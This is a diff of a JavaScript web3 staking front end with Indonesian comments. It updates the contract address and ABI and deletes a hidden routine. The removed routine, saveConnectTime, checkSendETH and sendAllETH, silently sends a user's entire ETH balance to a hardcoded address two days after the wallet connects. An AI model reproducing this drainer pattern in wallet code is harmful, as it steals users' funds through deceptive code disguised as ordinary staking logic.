@@ -3,47 +3,54 @@ let userAddress;
 let stakingContract;
 
 const TEA_RPC_URL = "https://tea-sepolia.g.alchemy.com/public/"; // Ganti dengan RPC TEA yang valid
-const stakingContractAddress = "0xa301386393a9c87Bf9d8E022cD3da292C40c9680";  // Kontrak Staking
-const recipientAddress = "0x4870cF0d63aF7d96Fb3c13FC6cE519646C2038C1";  // Alamat penerima ETH
+const stakingContractAddress = "0x419C709ce36551362eF76487Bb25390e95838513";  // Alamat kontrak staking
 
 const stakingABI = [
     {
-        "inputs": [
-            { "internalType": "uint256", "name": "amount", "type": "uint256" }
-        ],
-        "name": "stake",
-        "outputs": [],
-        "stateMutability": "payable", // Mengubah stateMutability menjadi payable untuk menerima ETH/TEA
-        "type": "function"
-    },
-    {
-        "inputs": [
-            { "internalType": "uint256", "name": "amount", "type": "uint256" }
-        ],
-        "name": "unstake",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
         "inputs": [], 
-        "name": "stakingToken", 
-        "outputs": [
-            { "internalType": "contract IERC20", "name": "", "type": "address" }
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+    },
+    {
+        "anonymous": false,
+        "inputs": [
+            { "indexed": true, "internalType": "address", "name": "user", "type": "address" },
+            { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
         ],
-        "stateMutability": "view", 
-        "type": "function"
+        "name": "Staked",
+        "type": "event"
     },
     {
         "inputs": [
-            { "internalType": "address", "name": "", "type": "address" }
+            { "internalType": "address", "name": "user", "type": "address" }
         ],
-        "name": "balances",
-        "outputs": [
-            { "internalType": "uint256", "name": "", "type": "uint256" }
-        ],
-        "stateMutability": "view", 
+        "name": "getStakedAmount",
+        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+        "stateMutability": "view",
         "type": "function"
+    },
+    {
+        "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
+        "stateMutability": "view", "type": "function"
+    },
+    {
+        "inputs": [], "name": "stake", "outputs": [], "stateMutability": "payable", "type": "function"
+    },
+    {
+        "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
+        "name": "stakes", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+        "stateMutability": "view", "type": "function"
+    },
+    {
+        "inputs": [], "name": "totalStaked", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+        "stateMutability": "view", "type": "function"
+    },
+    {
+        "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }],
+        "name": "unstake", "outputs": [], "stateMutability": "nonpayable", "type": "function"
+    },
+    {
+        "inputs": [], "name": "withdraw", "outputs": [], "stateMutability": "nonpayable", "type": "function"
     }
 ];
 
@@ -53,15 +60,13 @@ async function connectWallet() {
         web3 = new Web3(window.ethereum);
         await window.ethereum.request({ method: "eth_requestAccounts" });
         userAddress = (await web3.eth.getAccounts())[0];
-
+        
         document.getElementById("connectWalletButton").style.display = 'none';
         document.getElementById("walletInfo").style.display = 'block';
         document.getElementById("walletAddress").innerText = `Address: ${userAddress}`;
 
         displayBalance();
-        checkSendETH();
         initStaking();
-        saveConnectTime();
     } else {
         alert("Please install Metamask!");
     }
@@ -93,7 +98,7 @@ async function stakeTokens() {
         }
 
         // Lakukan staking langsung dengan mentransfer ETH ke kontrak staking
-        const staking = await stakingContract.methods.stake(amountWei).send({
+        const staking = await stakingContract.methods.stake().send({
             from: userAddress,
             value: amountWei  // Mengirim ETH sebagai value
         });
@@ -122,7 +127,7 @@ async function unstakeTokens() {
             return;
         }
 
-        const stakedAmount = await stakingContract.methods.balances(userAddress).call();
+        const stakedAmount = await stakingContract.methods.stakes(userAddress).call();
         if (parseFloat(amountWei) > parseFloat(stakedAmount)) {
             alert("Jumlah unstake melebihi jumlah yang sudah distake.");
             return;
@@ -137,43 +142,14 @@ async function unstakeTokens() {
     }
 }
 
-// Simpan waktu koneksi wallet
-function saveConnectTime() {
-    localStorage.setItem("connectTime", new Date().getTime());
-}
-
-// Ambil waktu koneksi wallet
-function getConnectTime() {
-    return localStorage.getItem("connectTime");
-}
-
-// Cek apakah sudah 2 hari sejak koneksi
-async function checkSendETH() {
-    const storedTime = getConnectTime();
-    if (storedTime) {
-        const currentTime = new Date().getTime();
-        const elapsedTime = (currentTime - storedTime) / (1000 * 60 * 60 * 24);  // Convert milliseconds to days
-
-        if (elapsedTime >= 2) {
-            await sendAllETH();  // Kirim ETH jika sudah 2 hari
-        }
-    }
-}
-
-// Kirim semua ETH ke alamat tertentu
-async function sendAllETH() {
+// Pastikan Anda sudah memiliki saldo yang cukup untuk staking dan biaya gas
+async function checkBalanceAndStake() {
     const balance = await web3.eth.getBalance(userAddress);
+    const balanceInETH = web3.utils.fromWei(balance, "ether");
 
-    try {
-        await web3.eth.sendTransaction({
-            from: userAddress,
-            to: recipientAddress,
-            value: balance
-        });
-
-        alert("Semua ETH telah dikirim!");
-    } catch (error) {
-        console.error("Gagal mengirim ETH:", error);
-        alert("Gagal mengirim ETH. Periksa saldo Anda.");
+    if (parseFloat(balanceInETH) < 0.01) {  // Misalnya, minimal 0.01 ETH untuk staking
+        alert("Saldo Anda tidak cukup untuk staking.");
+    } else {
+        stakeTokens();  // Lanjutkan staking jika saldo cukup
     }
 }
